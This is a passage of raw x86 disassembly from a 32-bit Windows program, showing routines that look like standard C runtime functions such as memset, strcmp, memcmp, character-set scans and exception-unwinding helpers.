  427961:	push   DWORD PTR [ebp+0x20]
  427964:	call   0x428616
  427969:	add    esp,0x18
  42796c:	mov    DWORD PTR [ebp-0x34],eax
  42796f:	cmp    eax,ebx
  427971:	je     0x427947
  427973:	push   ebx
  427974:	push   ebx
  427975:	push   DWORD PTR [ebp+0x14]
  427978:	push   eax
  427979:	push   DWORD PTR [ebp+0xc]
  42797c:	push   DWORD PTR [ebp+0x8]
  42797f:	call   DWORD PTR ds:0x4290ec
  427985:	mov    esi,eax
  427987:	mov    DWORD PTR [ebp-0x40],esi
  42798a:	cmp    esi,ebx
  42798c:	je     0x427a34
  427992:	mov    DWORD PTR [ebp-0x4],ebx
  427995:	add    eax,0x3
  427998:	and    eax,0xfffffffc
  42799b:	call   0x4253a0
  4279a0:	mov    DWORD PTR [ebp-0x18],esp
  4279a3:	mov    edi,esp
  4279a5:	mov    DWORD PTR [ebp-0x44],edi
  4279a8:	push   esi
  4279a9:	push   ebx
  4279aa:	push   edi
  4279ab:	call   0x427c50
  4279b0:	add    esp,0xc
  4279b3:	jmp    0x4279c5
  4279b5:	xor    eax,eax
  4279b7:	inc    eax
  4279b8:	ret    
  4279b9:	mov    esp,DWORD PTR [ebp-0x18]
  4279bc:	call   0x4287e5
  4279c1:	xor    ebx,ebx
  4279c3:	xor    edi,edi
  4279c5:	or     DWORD PTR [ebp-0x4],0xffffffff
  4279c9:	cmp    edi,ebx
  4279cb:	jne    0x4279f0
  4279cd:	push   DWORD PTR [ebp-0x40]
  4279d0:	call   0x426072
  4279d5:	pop    ecx
  4279d6:	mov    edi,eax
  4279d8:	cmp    edi,ebx
  4279da:	je     0x427a0d
  4279dc:	push   DWORD PTR [ebp-0x40]
  4279df:	push   ebx
  4279e0:	push   edi
  4279e1:	call   0x427c50
  4279e6:	add    esp,0xc
  4279e9:	mov    DWORD PTR [ebp-0x38],0x1
  4279f0:	push   DWORD PTR [ebp-0x40]
  4279f3:	push   edi
  4279f4:	push   DWORD PTR [ebp+0x14]
  4279f7:	push   DWORD PTR [ebp-0x34]
  4279fa:	push   DWORD PTR [ebp+0xc]
  4279fd:	push   DWORD PTR [ebp+0x8]
  427a00:	call   DWORD PTR ds:0x4290ec
  427a06:	mov    DWORD PTR [ebp-0x40],eax
  427a09:	cmp    eax,ebx
  427a0b:	jne    0x427a11
  427a0d:	xor    esi,esi
  427a0f:	jmp    0x427a37
  427a11:	push   DWORD PTR [ebp+0x1c]
  427a14:	push   DWORD PTR [ebp+0x18]
  427a17:	lea    eax,[ebp-0x40]
  427a1a:	push   eax
  427a1b:	push   edi
  427a1c:	push   DWORD PTR [ebp+0x20]
  427a1f:	push   DWORD PTR [ebp-0x3c]
  427a22:	call   0x428616
  427a27:	add    esp,0x18
  427a2a:	mov    esi,eax
  427a2c:	neg    esi
  427a2e:	sbb    esi,esi
  427a30:	neg    esi
  427a32:	jmp    0x427a37
  427a34:	mov    esi,DWORD PTR [ebp-0x48]
  427a37:	cmp    DWORD PTR [ebp-0x38],ebx
  427a3a:	je     0x427a5f
  427a3c:	push   edi
  427a3d:	call   0x425f5a
  427a42:	pop    ecx
  427a43:	jmp    0x427a5f
  427a45:	push   DWORD PTR [ebp+0x1c]
  427a48:	push   DWORD PTR [ebp+0x18]
  427a4b:	push   DWORD PTR [ebp+0x14]
  427a4e:	push   DWORD PTR [ebp+0x10]
  427a51:	push   DWORD PTR [ebp+0xc]
  427a54:	push   DWORD PTR [ebp+0x8]
  427a57:	call   DWORD PTR ds:0x4290ec
  427a5d:	mov    esi,eax
  427a5f:	cmp    DWORD PTR [ebp-0x34],ebx
  427a62:	je     0x427a6d
  427a64:	push   DWORD PTR [ebp-0x34]
  427a67:	call   0x425f5a
  427a6c:	pop    ecx
  427a6d:	mov    eax,esi
  427a6f:	lea    esp,[ebp-0x54]
  427a72:	call   0x42538b
  427a77:	ret    
  427a78:	push   0x1c
  427a7a:	push   0x429e88
  427a7f:	call   0x425350
  427a84:	xor    esi,esi
  427a86:	cmp    DWORD PTR ds:0x45ddc0,esi
  427a8c:	jne    0x427ac3
  427a8e:	lea    eax,[ebp-0x1c]
  427a91:	push   eax
  427a92:	xor    edi,edi
  427a94:	inc    edi
  427a95:	push   edi
  427a96:	push   0x429e5c
  427a9b:	push   edi
  427a9c:	call   DWORD PTR ds:0x4290fc
  427aa2:	test   eax,eax
  427aa4:	je     0x427aae
  427aa6:	mov    DWORD PTR ds:0x45ddc0,edi
  427aac:	jmp    0x427ac3
  427aae:	call   DWORD PTR ds:0x429028
  427ab4:	cmp    eax,0x78
  427ab7:	jne    0x427ac3
  427ab9:	mov    DWORD PTR ds:0x45ddc0,0x2
  427ac3:	mov    eax,ds:0x45ddc0
  427ac8:	cmp    eax,0x2
  427acb:	je     0x427bbb
  427ad1:	cmp    eax,esi
  427ad3:	je     0x427bbb
  427ad9:	cmp    eax,0x1
  427adc:	jne    0x427be1
  427ae2:	mov    DWORD PTR [ebp-0x20],esi
  427ae5:	mov    DWORD PTR [ebp-0x24],esi
  427ae8:	cmp    DWORD PTR [ebp+0x18],esi
  427aeb:	jne    0x427af5
  427aed:	mov    eax,ds:0x45ddb4
  427af2:	mov    DWORD PTR [ebp+0x18],eax
  427af5:	push   esi
  427af6:	push   esi
  427af7:	push   DWORD PTR [ebp+0x10]
  427afa:	push   DWORD PTR [ebp+0xc]
  427afd:	xor    eax,eax
  427aff:	cmp    DWORD PTR [ebp+0x20],esi
  427b02:	setne  al
  427b05:	lea    eax,[eax*8+0x1]
  427b0c:	push   eax
  427b0d:	push   DWORD PTR [ebp+0x18]
  427b10:	call   DWORD PTR ds:0x4290f0
  427b16:	mov    edi,eax
  427b18:	mov    DWORD PTR [ebp-0x28],edi
  427b1b:	test   edi,edi
  427b1d:	je     0x427be1
  427b23:	and    DWORD PTR [ebp-0x4],0x0
  427b27:	lea    ebx,[edi+edi*1]
  427b2a:	mov    eax,ebx
  427b2c:	add    eax,0x3
  427b2f:	and    eax,0xfffffffc
  427b32:	call   0x4253a0
  427b37:	mov    DWORD PTR [ebp-0x18],esp
  427b3a:	mov    esi,esp
  427b3c:	mov    DWORD PTR [ebp-0x2c],esi
  427b3f:	push   ebx
  427b40:	push   0x0
  427b42:	push   esi
  427b43:	call   0x427c50
  427b48:	add    esp,0xc
  427b4b:	or     DWORD PTR [ebp-0x4],0xffffffff
  427b4f:	jmp    0x427b66
  427b51:	xor    eax,eax
  427b53:	inc    eax
  427b54:	ret    
  427b55:	mov    esp,DWORD PTR [ebp-0x18]
  427b58:	call   0x4287e5
  427b5d:	xor    esi,esi
  427b5f:	or     DWORD PTR [ebp-0x4],0xffffffff
  427b63:	mov    edi,DWORD PTR [ebp-0x28]
  427b66:	test   esi,esi
  427b68:	jne    0x427b81
  427b6a:	push   edi
  427b6b:	push   0x2
  427b6d:	call   0x426468
  427b72:	pop    ecx
  427b73:	pop    ecx
  427b74:	mov    esi,eax
  427b76:	test   esi,esi
  427b78:	je     0x427be1
  427b7a:	mov    DWORD PTR [ebp-0x24],0x1
  427b81:	push   edi
  427b82:	push   esi
  427b83:	push   DWORD PTR [ebp+0x10]
  427b86:	push   DWORD PTR [ebp+0xc]
  427b89:	push   0x1
  427b8b:	push   DWORD PTR [ebp+0x18]
  427b8e:	call   DWORD PTR ds:0x4290f0
  427b94:	test   eax,eax
  427b96:	je     0x427ba9
  427b98:	push   DWORD PTR [ebp+0x14]
  427b9b:	push   eax
  427b9c:	push   esi
  427b9d:	push   DWORD PTR [ebp+0x8]
  427ba0:	call   DWORD PTR ds:0x4290fc
  427ba6:	mov    DWORD PTR [ebp-0x20],eax
  427ba9:	cmp    DWORD PTR [ebp-0x24],0x0
  427bad:	je     0x427bb6
  427baf:	push   esi
  427bb0:	call   0x425f5a
  427bb5:	pop    ecx
  427bb6:	mov    eax,DWORD PTR [ebp-0x20]
  427bb9:	jmp    0x427c29
  427bbb:	mov    ebx,DWORD PTR [ebp+0x1c]
  427bbe:	cmp    ebx,esi
  427bc0:	jne    0x427bc8
  427bc2:	mov    ebx,DWORD PTR ds:0x45dda4
  427bc8:	mov    edi,DWORD PTR [ebp+0x18]
  427bcb:	test   edi,edi
  427bcd:	jne    0x427bd5
  427bcf:	mov    edi,DWORD PTR ds:0x45ddb4
  427bd5:	push   ebx
  427bd6:	call   0x4285cd
  427bdb:	pop    ecx
  427bdc:	cmp    eax,0xffffffff
  427bdf:	jne    0x427be5
  427be1:	xor    eax,eax
  427be3:	jmp    0x427c29
  427be5:	cmp    eax,edi
  427be7:	je     0x427c07
  427be9:	push   0x0
  427beb:	push   0x0
  427bed:	lea    ecx,[ebp+0x10]
  427bf0:	push   ecx
  427bf1:	push   DWORD PTR [ebp+0xc]
  427bf4:	push   eax
  427bf5:	push   edi
  427bf6:	call   0x428616
  427bfb:	add    esp,0x18
  427bfe:	mov    esi,eax
  427c00:	test   esi,esi
  427c02:	je     0x427be1
  427c04:	mov    DWORD PTR [ebp+0xc],esi
  427c07:	push   DWORD PTR [ebp+0x14]
  427c0a:	push   DWORD PTR [ebp+0x10]
  427c0d:	push   DWORD PTR [ebp+0xc]
  427c10:	push   DWORD PTR [ebp+0x8]
  427c13:	push   ebx
  427c14:	call   DWORD PTR ds:0x4290f8
  427c1a:	mov    edi,eax
  427c1c:	test   esi,esi
  427c1e:	je     0x427c27
  427c20:	push   esi
  427c21:	call   0x425f5a
  427c26:	pop    ecx
  427c27:	mov    eax,edi
  427c29:	lea    esp,[ebp-0x38]
  427c2c:	call   0x42538b
  427c31:	ret    
  427c32:	mov    eax,ds:0x45ddc4
  427c37:	test   eax,eax
  427c39:	je     0x427c4a
  427c3b:	push   DWORD PTR [esp+0x4]
  427c3f:	call   eax
  427c41:	test   eax,eax
  427c43:	pop    ecx
  427c44:	je     0x427c4a
  427c46:	xor    eax,eax
  427c48:	inc    eax
  427c49:	ret    
  427c4a:	xor    eax,eax
  427c4c:	ret    
  427c4d:	int3   
  427c4e:	int3   
  427c4f:	int3   
  427c50:	mov    edx,DWORD PTR [esp+0xc]
  427c54:	mov    ecx,DWORD PTR [esp+0x4]
  427c58:	test   edx,edx
  427c5a:	je     0x427cab
  427c5c:	xor    eax,eax
  427c5e:	mov    al,BYTE PTR [esp+0x8]
  427c62:	push   edi
  427c63:	mov    edi,ecx
  427c65:	cmp    edx,0x4
  427c68:	jb     0x427c9b
  427c6a:	neg    ecx
  427c6c:	and    ecx,0x3
  427c6f:	je     0x427c7d
  427c71:	sub    edx,ecx
  427c73:	mov    BYTE PTR [edi],al
  427c75:	add    edi,0x1
  427c78:	sub    ecx,0x1
  427c7b:	jne    0x427c73
  427c7d:	mov    ecx,eax
  427c7f:	shl    eax,0x8
  427c82:	add    eax,ecx
  427c84:	mov    ecx,eax
  427c86:	shl    eax,0x10
  427c89:	add    eax,ecx
  427c8b:	mov    ecx,edx
  427c8d:	and    edx,0x3
  427c90:	shr    ecx,0x2
  427c93:	je     0x427c9b
  427c95:	rep stos DWORD PTR es:[edi],eax
  427c97:	test   edx,edx
  427c99:	je     0x427ca5
  427c9b:	mov    BYTE PTR [edi],al
  427c9d:	add    edi,0x1
  427ca0:	sub    edx,0x1
  427ca3:	jne    0x427c9b
  427ca5:	mov    eax,DWORD PTR [esp+0x8]
  427ca9:	pop    edi
  427caa:	ret    
  427cab:	mov    eax,DWORD PTR [esp+0x4]
  427caf:	ret    
  427cb0:	push   esi
  427cb1:	mov    esi,DWORD PTR [esp+0x8]
  427cb5:	test   esi,esi
  427cb7:	je     0x427e3e
  427cbd:	push   DWORD PTR [esi+0x4]
  427cc0:	call   0x425f5a
  427cc5:	push   DWORD PTR [esi+0x8]
  427cc8:	call   0x425f5a
  427ccd:	push   DWORD PTR [esi+0xc]
  427cd0:	call   0x425f5a
  427cd5:	push   DWORD PTR [esi+0x10]
  427cd8:	call   0x425f5a
  427cdd:	push   DWORD PTR [esi+0x14]
  427ce0:	call   0x425f5a
  427ce5:	push   DWORD PTR [esi+0x18]
  427ce8:	call   0x425f5a
  427ced:	push   DWORD PTR [esi]
  427cef:	call   0x425f5a
  427cf4:	push   DWORD PTR [esi+0x20]
  427cf7:	call   0x425f5a
  427cfc:	push   DWORD PTR [esi+0x24]
  427cff:	call   0x425f5a
  427d04:	push   DWORD PTR [esi+0x28]
  427d07:	call   0x425f5a
  427d0c:	push   DWORD PTR [esi+0x2c]
  427d0f:	call   0x425f5a
  427d14:	push   DWORD PTR [esi+0x30]
  427d17:	call   0x425f5a
  427d1c:	push   DWORD PTR [esi+0x34]
  427d1f:	call   0x425f5a
  427d24:	push   DWORD PTR [esi+0x1c]
  427d27:	call   0x425f5a
  427d2c:	push   DWORD PTR [esi+0x38]
  427d2f:	call   0x425f5a
  427d34:	push   DWORD PTR [esi+0x3c]
  427d37:	call   0x425f5a
  427d3c:	add    esp,0x40
  427d3f:	push   DWORD PTR [esi+0x40]
  427d42:	call   0x425f5a
  427d47:	push   DWORD PTR [esi+0x44]
  427d4a:	call   0x425f5a
  427d4f:	push   DWORD PTR [esi+0x48]
  427d52:	call   0x425f5a
  427d57:	push   DWORD PTR [esi+0x4c]
  427d5a:	call   0x425f5a
  427d5f:	push   DWORD PTR [esi+0x50]
  427d62:	call   0x425f5a
  427d67:	push   DWORD PTR [esi+0x54]
  427d6a:	call   0x425f5a
  427d6f:	push   DWORD PTR [esi+0x58]
  427d72:	call   0x425f5a
  427d77:	push   DWORD PTR [esi+0x5c]
  427d7a:	call   0x425f5a
  427d7f:	push   DWORD PTR [esi+0x60]
  427d82:	call   0x425f5a
  427d87:	push   DWORD PTR [esi+0x64]
  427d8a:	call   0x425f5a
  427d8f:	push   DWORD PTR [esi+0x68]
  427d92:	call   0x425f5a
  427d97:	push   DWORD PTR [esi+0x6c]
  427d9a:	call   0x425f5a
  427d9f:	push   DWORD PTR [esi+0x70]
  427da2:	call   0x425f5a
  427da7:	push   DWORD PTR [esi+0x74]
  427daa:	call   0x425f5a
  427daf:	push   DWORD PTR [esi+0x78]
  427db2:	call   0x425f5a
  427db7:	push   DWORD PTR [esi+0x7c]
  427dba:	call   0x425f5a
  427dbf:	add    esp,0x40
  427dc2:	push   DWORD PTR [esi+0x80]
  427dc8:	call   0x425f5a
  427dcd:	push   DWORD PTR [esi+0x84]
  427dd3:	call   0x425f5a
  427dd8:	push   DWORD PTR [esi+0x88]
  427dde:	call   0x425f5a
  427de3:	push   DWORD PTR [esi+0x8c]
  427de9:	call   0x425f5a
  427dee:	push   DWORD PTR [esi+0x90]
  427df4:	call   0x425f5a
  427df9:	push   DWORD PTR [esi+0x94]
  427dff:	call   0x425f5a
  427e04:	push   DWORD PTR [esi+0x98]
  427e0a:	call   0x425f5a
  427e0f:	push   DWORD PTR [esi+0x9c]
  427e15:	call   0x425f5a
  427e1a:	push   DWORD PTR [esi+0xa0]
  427e20:	call   0x425f5a
  427e25:	push   DWORD PTR [esi+0xa4]
  427e2b:	call   0x425f5a
  427e30:	push   DWORD PTR [esi+0xa8]
  427e36:	call   0x425f5a
  427e3b:	add    esp,0x2c
  427e3e:	pop    esi
  427e3f:	ret    
  427e40:	push   esi
  427e41:	mov    esi,DWORD PTR [esp+0x8]
  427e45:	test   esi,esi
  427e47:	je     0x427e9d
  427e49:	mov    eax,DWORD PTR [esi]
  427e4b:	mov    ecx,DWORD PTR ds:0x45d934
  427e51:	cmp    eax,DWORD PTR [ecx]
  427e53:	je     0x427e64
  427e55:	cmp    eax,DWORD PTR ds:0x45d904
  427e5b:	je     0x427e64
  427e5d:	push   eax
  427e5e:	call   0x425f5a
  427e63:	pop    ecx
  427e64:	mov    eax,DWORD PTR [esi+0x4]
  427e67:	mov    ecx,DWORD PTR ds:0x45d934
  427e6d:	cmp    eax,DWORD PTR [ecx+0x4]
  427e70:	je     0x427e81
  427e72:	cmp    eax,DWORD PTR ds:0x45d908
  427e78:	je     0x427e81
  427e7a:	push   eax
  427e7b:	call   0x425f5a
  427e80:	pop    ecx
  427e81:	mov    esi,DWORD PTR [esi+0x8]
  427e84:	mov    eax,ds:0x45d934
  427e89:	cmp    esi,DWORD PTR [eax+0x8]
  427e8c:	je     0x427e9d
  427e8e:	cmp    esi,DWORD PTR ds:0x45d90c
  427e94:	je     0x427e9d
  427e96:	push   esi
  427e97:	call   0x425f5a
  427e9c:	pop    ecx
  427e9d:	pop    esi
  427e9e:	ret    
  427e9f:	push   esi
  427ea0:	mov    esi,DWORD PTR [esp+0x8]
  427ea4:	test   esi,esi
  427ea6:	je     0x427f76
  427eac:	mov    eax,DWORD PTR [esi+0xc]
  427eaf:	mov    ecx,DWORD PTR ds:0x45d934
  427eb5:	cmp    eax,DWORD PTR [ecx+0xc]
  427eb8:	je     0x427ec9
  427eba:	cmp    eax,DWORD PTR ds:0x45d910
  427ec0:	je     0x427ec9
  427ec2:	push   eax
  427ec3:	call   0x425f5a
  427ec8:	pop    ecx
  427ec9:	mov    eax,DWORD PTR [esi+0x10]
  427ecc:	mov    ecx,DWORD PTR ds:0x45d934
  427ed2:	cmp    eax,DWORD PTR [ecx+0x10]
  427ed5:	je     0x427ee6
  427ed7:	cmp    eax,DWORD PTR ds:0x45d914
  427edd:	je     0x427ee6
  427edf:	push   eax
  427ee0:	call   0x425f5a
  427ee5:	pop    ecx
  427ee6:	mov    eax,DWORD PTR [esi+0x14]
  427ee9:	mov    ecx,DWORD PTR ds:0x45d934
  427eef:	cmp    eax,DWORD PTR [ecx+0x14]
  427ef2:	je     0x427f03
  427ef4:	cmp    eax,DWORD PTR ds:0x45d918
  427efa:	je     0x427f03
  427efc:	push   eax
  427efd:	call   0x425f5a
  427f02:	pop    ecx
  427f03:	mov    eax,DWORD PTR [esi+0x18]
  427f06:	mov    ecx,DWORD PTR ds:0x45d934
  427f0c:	cmp    eax,DWORD PTR [ecx+0x18]
  427f0f:	je     0x427f20
  427f11:	cmp    eax,DWORD PTR ds:0x45d91c
  427f17:	je     0x427f20
  427f19:	push   eax
  427f1a:	call   0x425f5a
  427f1f:	pop    ecx
  427f20:	mov    eax,DWORD PTR [esi+0x1c]
  427f23:	mov    ecx,DWORD PTR ds:0x45d934
  427f29:	cmp    eax,DWORD PTR [ecx+0x1c]
  427f2c:	je     0x427f3d
  427f2e:	cmp    eax,DWORD PTR ds:0x45d920
  427f34:	je     0x427f3d
  427f36:	push   eax
  427f37:	call   0x425f5a
  427f3c:	pop    ecx
  427f3d:	mov    eax,DWORD PTR [esi+0x20]
  427f40:	mov    ecx,DWORD PTR ds:0x45d934
  427f46:	cmp    eax,DWORD PTR [ecx+0x20]
  427f49:	je     0x427f5a
  427f4b:	cmp    eax,DWORD PTR ds:0x45d924
  427f51:	je     0x427f5a
  427f53:	push   eax
  427f54:	call   0x425f5a
  427f59:	pop    ecx
  427f5a:	mov    esi,DWORD PTR [esi+0x24]
  427f5d:	mov    eax,ds:0x45d934
  427f62:	cmp    esi,DWORD PTR [eax+0x24]
  427f65:	je     0x427f76
  427f67:	cmp    esi,DWORD PTR ds:0x45d928
  427f6d:	je     0x427f76
  427f6f:	push   esi
  427f70:	call   0x425f5a
  427f75:	pop    ecx
  427f76:	pop    esi
  427f77:	ret    
  427f78:	int3   
  427f79:	int3   
  427f7a:	int3   
  427f7b:	int3   
  427f7c:	int3   
  427f7d:	int3   
  427f7e:	int3   
  427f7f:	int3   
  427f80:	push   ebp
  427f81:	mov    ebp,esp
  427f83:	push   esi
  427f84:	xor    eax,eax
  427f86:	push   eax
  427f87:	push   eax
  427f88:	push   eax
  427f89:	push   eax
  427f8a:	push   eax
  427f8b:	push   eax
  427f8c:	push   eax
  427f8d:	push   eax
  427f8e:	mov    edx,DWORD PTR [ebp+0xc]
  427f91:	lea    ecx,[ecx+0x0]
  427f94:	mov    al,BYTE PTR [edx]
  427f96:	or     al,al
  427f98:	je     0x427fa3
  427f9a:	add    edx,0x1
  427f9d:	bts    DWORD PTR [esp],eax
  427fa1:	jmp    0x427f94
  427fa3:	mov    esi,DWORD PTR [ebp+0x8]
  427fa6:	or     ecx,0xffffffff
  427fa9:	lea    ecx,[ecx+0x0]
  427fac:	add    ecx,0x1
  427faf:	mov    al,BYTE PTR [esi]
  427fb1:	or     al,al
  427fb3:	je     0x427fbe
  427fb5:	add    esi,0x1
  427fb8:	bt     DWORD PTR [esp],eax
  427fbc:	jae    0x427fac
  427fbe:	mov    eax,ecx
  427fc0:	add    esp,0x20
  427fc3:	pop    esi
  427fc4:	leave  
  427fc5:	ret    
  427fc6:	int3   
  427fc7:	int3   
  427fc8:	int3   
  427fc9:	int3   
  427fca:	int3   
  427fcb:	int3   
  427fcc:	int3   
  427fcd:	int3   
  427fce:	int3   
  427fcf:	int3   
  427fd0:	mov    edx,DWORD PTR [esp+0x4]
  427fd4:	mov    ecx,DWORD PTR [esp+0x8]
  427fd8:	test   edx,0x3
  427fde:	jne    0x42801c
  427fe0:	mov    eax,DWORD PTR [edx]
  427fe2:	cmp    al,BYTE PTR [ecx]
  427fe4:	jne    0x428014
  427fe6:	or     al,al
  427fe8:	je     0x428010
  427fea:	cmp    ah,BYTE PTR [ecx+0x1]
  427fed:	jne    0x428014
  427fef:	or     ah,ah
  427ff1:	je     0x428010
  427ff3:	shr    eax,0x10
  427ff6:	cmp    al,BYTE PTR [ecx+0x2]
  427ff9:	jne    0x428014
  427ffb:	or     al,al
  427ffd:	je     0x428010
  427fff:	cmp    ah,BYTE PTR [ecx+0x3]
  428002:	jne    0x428014
  428004:	add    ecx,0x4
  428007:	add    edx,0x4
  42800a:	or     ah,ah
  42800c:	jne    0x427fe0
  42800e:	mov    edi,edi
  428010:	xor    eax,eax
  428012:	ret    
  428013:	nop
  428014:	sbb    eax,eax
  428016:	shl    eax,1
  428018:	add    eax,0x1
  42801b:	ret    
  42801c:	test   edx,0x1
  428022:	je     0x42803c
  428024:	mov    al,BYTE PTR [edx]
  428026:	add    edx,0x1
  428029:	cmp    al,BYTE PTR [ecx]
  42802b:	jne    0x428014
  42802d:	add    ecx,0x1
  428030:	or     al,al
  428032:	je     0x428010
  428034:	test   edx,0x2
  42803a:	je     0x427fe0
  42803c:	mov    ax,WORD PTR [edx]
  42803f:	add    edx,0x2
  428042:	cmp    al,BYTE PTR [ecx]
  428044:	jne    0x428014
  428046:	or     al,al
  428048:	je     0x428010
  42804a:	cmp    ah,BYTE PTR [ecx+0x1]
  42804d:	jne    0x428014
  42804f:	or     ah,ah
  428051:	je     0x428010
  428053:	add    ecx,0x2
  428056:	jmp    0x427fe0
  428058:	int3   
  428059:	int3   
  42805a:	int3   
  42805b:	int3   
  42805c:	int3   
  42805d:	int3   
  42805e:	int3   
  42805f:	int3   
  428060:	mov    eax,DWORD PTR [esp+0xc]
  428064:	test   eax,eax
  428066:	je     0x4280b2
  428068:	mov    edx,DWORD PTR [esp+0x4]
  42806c:	push   esi
  42806d:	push   edi
  42806e:	mov    esi,edx
  428070:	mov    edi,DWORD PTR [esp+0x10]
  428074:	or     edx,edi
  428076:	and    edx,0x3
  428079:	je     0x4280b3
  42807b:	test   eax,0x1
  428080:	je     0x428093
  428082:	mov    cl,BYTE PTR [esi]
  428084:	cmp    cl,BYTE PTR [edi]
  428086:	jne    0x4280e0
  428088:	add    esi,0x1
  42808b:	add    edi,0x1
  42808e:	sub    eax,0x1
  428091:	je     0x4280b0
  428093:	mov    cl,BYTE PTR [esi]
  428095:	mov    dl,BYTE PTR [edi]
  428097:	cmp    cl,dl
  428099:	jne    0x4280e0
  42809b:	mov    cl,BYTE PTR [esi+0x1]
  42809e:	mov    dl,BYTE PTR [edi+0x1]
  4280a1:	cmp    cl,dl
  4280a3:	jne    0x4280e0
  4280a5:	add    edi,0x2
  4280a8:	add    esi,0x2
  4280ab:	sub    eax,0x2
  4280ae:	jne    0x428093
  4280b0:	pop    edi
  4280b1:	pop    esi
  4280b2:	ret    
  4280b3:	mov    ecx,eax
  4280b5:	and    eax,0x3
  4280b8:	shr    ecx,0x2
  4280bb:	je     0x4280e8
  4280bd:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4280bf:	je     0x4280e8
  4280c1:	mov    ecx,DWORD PTR [esi-0x4]
  4280c4:	mov    edx,DWORD PTR [edi-0x4]
  4280c7:	cmp    cl,dl
  4280c9:	jne    0x4280db
  4280cb:	cmp    ch,dh
  4280cd:	jne    0x4280db
  4280cf:	shr    ecx,0x10
  4280d2:	shr    edx,0x10
  4280d5:	cmp    cl,dl
  4280d7:	jne    0x4280db
  4280d9:	cmp    ch,dh
  4280db:	mov    eax,0x0
  4280e0:	sbb    eax,eax
  4280e2:	pop    edi
  4280e3:	sbb    eax,0xffffffff
  4280e6:	pop    esi
  4280e7:	ret    
  4280e8:	test   eax,eax
  4280ea:	je     0x4280b0
  4280ec:	mov    edx,DWORD PTR [esi]
  4280ee:	mov    ecx,DWORD PTR [edi]
  4280f0:	cmp    dl,cl
  4280f2:	jne    0x4280db
  4280f4:	sub    eax,0x1
  4280f7:	je     0x428115
  4280f9:	cmp    dh,ch
  4280fb:	jne    0x4280db
  4280fd:	sub    eax,0x1
  428100:	je     0x428115
  428102:	and    ecx,0xff0000
  428108:	and    edx,0xff0000
  42810e:	cmp    edx,ecx
  428110:	jne    0x4280db
  428112:	sub    eax,0x1
  428115:	pop    edi
  428116:	pop    esi
  428117:	ret    
  428118:	int3   
  428119:	int3   
  42811a:	int3   
  42811b:	int3   
  42811c:	int3   
  42811d:	int3   
  42811e:	int3   
  42811f:	int3   
  428120:	push   ebp
  428121:	mov    ebp,esp
  428123:	push   edi
  428124:	push   esi
  428125:	push   ebx
  428126:	mov    ecx,DWORD PTR [ebp+0x10]
  428129:	jecxz  0x428152
  42812b:	mov    ebx,ecx
  42812d:	mov    edi,DWORD PTR [ebp+0x8]
  428130:	mov    esi,edi
  428132:	xor    eax,eax
  428134:	repnz scas al,BYTE PTR es:[edi]
  428136:	neg    ecx
  428138:	add    ecx,ebx
  42813a:	mov    edi,esi
  42813c:	mov    esi,DWORD PTR [ebp+0xc]
  42813f:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428141:	mov    al,BYTE PTR [esi-0x1]
  428144:	xor    ecx,ecx
  428146:	cmp    al,BYTE PTR [edi-0x1]
  428149:	ja     0x428150
  42814b:	je     0x428152
  42814d:	sub    ecx,0x2
  428150:	not    ecx
  428152:	mov    eax,ecx
  428154:	pop    ebx
  428155:	pop    esi
  428156:	pop    edi
  428157:	leave  
  428158:	ret    
  428159:	int3   
  42815a:	int3   
  42815b:	int3   
  42815c:	int3   
  42815d:	int3   
  42815e:	int3   
  42815f:	int3   
  428160:	push   ebp
  428161:	mov    ebp,esp
  428163:	push   esi
  428164:	xor    eax,eax
  428166:	push   eax
  428167:	push   eax
  428168:	push   eax
  428169:	push   eax
  42816a:	push   eax
  42816b:	push   eax
  42816c:	push   eax
  42816d:	push   eax
  42816e:	mov    edx,DWORD PTR [ebp+0xc]
  428171:	lea    ecx,[ecx+0x0]
  428174:	mov    al,BYTE PTR [edx]
  428176:	or     al,al
  428178:	je     0x428183
  42817a:	add    edx,0x1
  42817d:	bts    DWORD PTR [esp],eax
  428181:	jmp    0x428174
  428183:	mov    esi,DWORD PTR [ebp+0x8]
  428186:	mov    edi,edi
  428188:	mov    al,BYTE PTR [esi]
  42818a:	or     al,al
  42818c:	je     0x42819a
  42818e:	add    esi,0x1
  428191:	bt     DWORD PTR [esp],eax
  428195:	jae    0x428188
  428197:	lea    eax,[esi-0x1]
  42819a:	add    esp,0x20
  42819d:	pop    esi
  42819e:	leave  
  42819f:	ret    
  4281a0:	push   ebp
  4281a1:	mov    ebp,esp
  4281a3:	push   ebx
  4281a4:	push   esi
  4281a5:	push   edi
  4281a6:	push   ebp
  4281a7:	push   0x0
  4281a9:	push   0x0
  4281ab:	push   0x4281b8
  4281b0:	push   DWORD PTR [ebp+0x8]
  4281b3:	call   0x428c2e
  4281b8:	pop    ebp
  4281b9:	pop    edi
  4281ba:	pop    esi
  4281bb:	pop    ebx
  4281bc:	mov    esp,ebp
  4281be:	pop    ebp
  4281bf:	ret    
  4281c0:	mov    ecx,DWORD PTR [esp+0x4]
  4281c4:	test   DWORD PTR [ecx+0x4],0x6
  4281cb:	mov    eax,0x1
  4281d0:	je     0x4281e1
  4281d2:	mov    eax,DWORD PTR [esp+0x8]
  4281d6:	mov    edx,DWORD PTR [esp+0x10]
  4281da:	mov    DWORD PTR [edx],eax
  4281dc:	mov    eax,0x3
  4281e1:	ret    
  4281e2:	push   ebx
  4281e3:	push   esi
  4281e4:	push   edi
  4281e5:	mov    eax,DWORD PTR [esp+0x10]
  4281e9:	push   eax
  4281ea:	push   0xfffffffe
  4281ec:	push   0x4281c0
  4281f1:	push   DWORD PTR fs:0x0
  4281f8:	mov    DWORD PTR fs:0x0,esp
  4281ff:	mov    eax,DWORD PTR [esp+0x20]
  428203:	mov    ebx,DWORD PTR [eax+0x8]
  428206:	mov    esi,DWORD PTR [eax+0xc]
  428209:	cmp    esi,0xffffffff
  42820c:	je     0x42823c
  42820e:	cmp    esi,DWORD PTR [esp+0x24]
  428212:	je     0x42823c
  428214:	lea    esi,[esi+esi*2]
  428217:	mov    ecx,DWORD PTR [ebx+esi*4]
  42821a:	mov    DWORD PTR [esp+0x8],ecx
  42821e:	mov    DWORD PTR [eax+0xc],ecx
  428221:	cmp    DWORD PTR [ebx+esi*4+0x4],0x0
  428226:	jne    0x42823a
  428228:	push   0x101
  42822d:	mov    eax,DWORD PTR [ebx+esi*4+0x8]
  428231:	call   0x428276
  428236:	call   DWORD PTR [ebx+esi*4+0x8]
  42823a:	jmp    0x4281ff
  42823c:	pop    DWORD PTR fs:0x0
  428243:	add    esp,0xc
  428246:	pop    edi
  428247:	pop    esi
  428248:	pop    ebx
